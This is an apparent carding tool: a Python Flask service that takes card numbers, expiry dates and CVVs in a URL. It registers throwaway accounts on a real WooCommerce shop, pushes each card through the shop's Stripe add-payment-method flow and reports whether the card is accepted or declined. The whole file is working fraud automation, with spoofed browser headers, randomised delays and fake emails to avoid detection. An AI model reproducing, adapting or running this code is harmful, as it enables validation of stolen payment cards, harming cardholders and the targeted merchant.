from flask import Flask, jsonify, request
import requests
import json
import re
import time
import random
import datetime
from typing import Dict, Any, Optional
from faker import Faker

app = Flask(__name__)
faker = Faker()

def auto_request(
    url: str,
    method: str = 'GET',
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    params: Optional[Dict[str, Any]] = None,
    json_data: Optional[Dict[str, Any]] = None,
    dynamic_params: Optional[Dict[str, Any]] = None,
    session: Optional[requests.Session] = None
) -> requests.Response:
 
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value
    
    if data is None:
        data = {}
    if params is None:
        params = {}

    if dynamic_params:
        for key, value in dynamic_params.items():
            if 'ajax' in key.lower():
                params[key] = value
            else:
                data[key] = value

    req_session = session if session else requests.Session()
    
    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'data': data if data else None,
        'params': params if params else None,
        'json': json_data,
        'cookies': {}
    }
    
    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}
    response = req_session.request(method, **request_kwargs)
    response.raise_for_status()
    
    return response

def run_automated_process(card_num, card_cvv, card_yy, card_mm, user_ag, client_element, guid, muid, sid):
    session = requests.Session()
    base_url = 'https://dilaboards.com'
    
    # Step 1: Initial GET request
    url_1 = f'{base_url}/en/moj-racun/add-payment-method/'
    headers_1 = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Alt-Used': 'dilaboards.com',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }
    
    try:
        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session)
        regester_nouce = re.findall('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)[0]
        pk = re.findall('"key":"(.*?)"', response_1.text)[0]
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        return {"error": f"Step 1 failed: {str(e)}"}

    # Step 2: Register email POST request
    url_2 = f'{base_url}/en/moj-racun/add-payment-method/'
    headers_2 = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': base_url,
        'Alt-Used': 'dilaboards.com',
        'Connection': 'keep-alive',
        'Referer': url_1,
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }
    data_2 = {
        'email': faker.email(domain="gamil.com"),
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': url_1,
        'wc_order_attribution_session_start_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'wc_order_attribution_session_pages': '2',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': user_ag,
        'woocommerce-register-nonce': regester_nouce,
        '_wp_http_referer': '/en/moj-racun/add-payment-method/',
        'register': 'Register',
    }
    
    try:
        response_2 = auto_request(url_2, method='POST', headers=headers_2, data=data_2, session=session)
        ajax_nonce = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', response_2.text)[0]
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        return {"error": f"Step 2 failed: {str(e)}"}

    # Step 3: Stripe API payment method creation
    url_3 = 'https://api.stripe.com/v1/payment_methods'
    headers_3 = {
        'User-Agent': user_ag,
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://js.stripe.com/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Priority': 'u=4',
    }
    
    data_3 = {
        'type': 'card',
        f'card[number]': card_num,
        f'card[cvc]': card_cvv,
        f'card[exp_year]': card_yy,
        f'card[exp_month]': card_mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][postal_code]': '11081',
        'billing_details[address][country]': 'US',
        'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
        'referrer': f'{base_url}',
        'time_on_page': str(random.randint(100000, 999999)), 
        'client_attribution_metadata[client_session_id]': client_element,
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'client_attribution_metadata[elements_session_config_id]': client_element,
        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'key': pk,
        '_stripe_version': '2024-06-20',
    }
    
    try:
        response_3 = auto_request(url_3, method='POST', headers=headers_3, data=data_3, session=session)
        response_json = response_3.json()
        
        # Check if there's an error from Stripe
        if 'error' in response_json:
            error = response_json['error']
            return {
                "message": error.get('message', 'Payment failed'),
                "code": error.get('code', 'unknown_error'),
                "decline_code": error.get('decline_code', ''),
                "type": error.get('type', '')
            }
        
        pm = response_json['id']
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        # Try to parse error response if it exists
        if hasattr(e, 'response') and e.response is not None:
            try:
                error_json = e.response.json()
                if 'error' in error_json:
                    error = error_json['error']
                    return {
                        "message": error.get('message', 'Payment failed'),
                        "code": error.get('code', 'unknown_error'),
                        "decline_code": error.get('decline_code', ''),
                        "type": error.get('type', '')
                    }
            except:
                return {"error": f"Stripe API Error: {e.response.text}"}
        return {"error": f"Request failed: {str(e)}"}

    # Step 4: Final confirmation request
    url_4 = f'{base_url}/en/'
    headers_4 = {
        'User-Agent': user_ag,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': base_url,
        'Alt-Used': 'dilaboards.com',
        'Connection': 'keep-alive',
        'Referer': url_1,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
    
    dynamic_params_4 = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': ajax_nonce,
    }
    
    try:
        response_4 = auto_request(url_4, method='POST', headers=headers_4, dynamic_params=dynamic_params_4, session=session)
        response_4_json = response_4.json()
        
        # Check for success or error in final response
        if response_4_json.get('success'):
            return {
                "success": True,
                "message": "Payment method added successfully",
                "response": response_4_json
            }
        else:
            return {
                "success": False,
                "message": response_4_json.get('message', 'Payment failed'),
                "response": response_4_json
            }
    except Exception as e:
        if hasattr(e, 'response') and e.response is not None:
            try:
                error_json = e.response.json()
                return {
                    "message": error_json.get('message', 'Payment failed'),
                    "code": error_json.get('code', 'unknown_error'),
                    "response": error_json
                }
            except:
                return {"error": f"Final Request Error: {e.response.text}"}
        return {"error": f"Request failed: {str(e)}"}

@app.route('/<card_number>/<exp_month>/<exp_year>/<cvv>', methods=['GET', 'POST'])
def process_payment(card_number, exp_month, exp_year, cvv):
    """
    API endpoint to process card payment
    Example: GET /4242424242424242/08/27/276
    """
    # Default values (you can modify these or pass them as query params)
    USER_AGENT = request.args.get('user_agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36')
    CLIENT_ELEMENT = request.args.get('client_element', 'src_1234567890abcdef')
    GUID = request.args.get('guid', 'guid_placeholder')
    MUID = request.args.get('muid', 'muid_placeholder')
    SID = request.args.get('sid', 'sid_placeholder')
    
    # Validate card details
    if not card_number or not exp_month or not exp_year or not cvv:
        return jsonify({
            "error": "Missing required parameters",
            "message": "Please provide card number, expiry month, expiry year, and CVV"
        }), 400
    
    # Process the payment
    result = run_automated_process(
        card_num=card_number,
        card_cvv=cvv,
        card_yy=exp_year,
        card_mm=exp_month,
        user_ag=USER_AGENT,
        client_element=CLIENT_ELEMENT,
        guid=GUID,
        muid=MUID,
        sid=SID
    )
    
    # Return the result as JSON
    return jsonify(result)

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({"status": "healthy", "message": "API is running"})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
